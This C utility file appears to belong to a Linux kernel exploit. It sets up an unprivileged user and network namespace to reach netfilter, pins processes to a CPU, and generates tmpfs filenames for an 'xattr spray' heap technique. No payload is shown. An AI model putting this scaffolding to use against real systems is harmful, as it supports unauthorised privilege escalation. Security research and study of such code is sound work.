#define _GNU_SOURCE
#include <stdint.h>
#include <stdlib.h>
#include <sched.h>
#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <sys/utsname.h>

#include "log.h"
#include "util.h"

/**
 * write_file(): Write a string into a file
 * @filename: File to write
 * @text: Text to write
 */
void write_file(const char *filename, char *text) {

    int fd = open(filename, O_RDWR);

    write(fd, text, strlen(text));
    close(fd);
}

/**
 * new_ns(): Change the current namespace to access to netfilter and
 * to be able to write security xattr in a tmpfs
 */
void new_ns(void) {

    uid_t uid = getuid();
    gid_t gid = getgid();
    char buffer[0x100];

    if (unshare(CLONE_NEWUSER | CLONE_NEWNS))
        do_error_exit("unshare(CLONE_NEWUSER | CLONE_NEWNS)");

    if (unshare(CLONE_NEWNET))
        do_error_exit("unshare(CLONE_NEWNET)");
    
    write_file("/proc/self/setgroups", "deny");

    snprintf(buffer, sizeof(buffer), "0 %d 1", uid);
    write_file("/proc/self/uid_map", buffer);
    snprintf(buffer, sizeof(buffer), "0 %d 1", gid);
    write_file("/proc/self/gid_map", buffer);
}

/**
 * set_cpu_affinity(): Pin a process to a CPU
 * @cpu_n: CPU to use
 * @pid: pid of the process to attach
 */
void set_cpu_affinity(int cpu_n, pid_t pid) {
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu_n, &set);

    if (sched_setaffinity(pid, sizeof(set), &set) < 0)
        do_error_exit("sched_setaffinity");
}

/**
 * generate_tmp_filename(): Generate a filename to be used with
 *  the xattr spray
 *
 * Return: New generated filename
 */
char *generate_tmp_filename(void) {
    static char buffer[FILENAME_MAX_LEN];
    static uint64_t counter = 0;

    snprintf(buffer, FILENAME_MAX_LEN, "/tmp/tmpfs/file%lu", counter);
    counter++;

    return buffer;
}
